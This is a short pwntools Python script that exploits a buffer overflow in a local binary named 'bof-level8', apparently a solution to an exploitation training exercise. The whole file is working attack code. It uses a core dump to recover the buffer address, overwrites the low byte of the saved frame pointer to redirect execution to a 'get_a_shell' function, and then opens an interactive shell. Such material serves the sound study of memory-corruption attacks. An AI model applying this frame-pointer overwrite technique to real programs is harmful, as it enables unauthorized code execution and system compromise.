from pwn import *

# Set up attack
p = process("./bof-level8")
e = ELF("./bof-level8")

# Need to change ending address to start of buffer
# Find by inspecting core file and finding the 78's
# Create a segfault with a random guess to make core file
prog_input = p64(0x7878787878787878) + (p64(e.symbols['get_a_shell'])) + 112 * 'a' + "\x60"
p.sendline(prog_input)
p.wait()

# Parse core file to get the last byte of the buffer address
c = Core('./core')
buff = c.stack.find(prog_input)
end = buff & 0x00000000000000ff

# Change EBP to buffer address and EBP + 4 to return address (get a shell)
p = process("./bof-level8")
prog_input = p64(0x7878787878787878) + (p64(e.symbols['get_a_shell'])) + 112 * 'a' + chr(end)
p.sendline(prog_input)
p.interactive()
